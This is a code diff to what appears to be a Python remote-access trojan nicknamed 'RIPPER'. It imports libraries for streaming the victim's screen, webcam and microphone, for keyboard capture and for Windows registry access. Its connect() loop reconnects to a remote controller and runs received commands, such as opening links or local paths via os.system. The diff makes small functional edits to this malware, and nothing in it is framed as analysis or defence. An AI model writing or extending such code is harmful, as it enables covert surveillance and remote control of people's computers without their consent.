@@ -1,8 +1,9 @@
 from vidstream import ScreenShareClient;
+import socket, os, sys, time, random;
 from vidstream import CameraClient;
 from vidstream import AudioSender;
 import winreg as reg, subprocess;
-import socket, os, sys, time;
+import pyautogui;
 import keyboard;
 import base64;
 
@@ -118,6 +119,8 @@ def connect():
                 link = command[10:];
                 if link[:8] == 'https://':
                     pass;
+                elif link[:3] == 'C:\\':
+                    pass;
                 else:
                     link = f'https://{link}';
                 os.system(f'start {link}');
@@ -154,7 +157,6 @@ def connect():
         except Exception:
             connect();
             s.send('[RIPPER] Error'.encode('utf-8', errors='ignore'));
-      
 connect();
 connected = False;
 while (not connected):
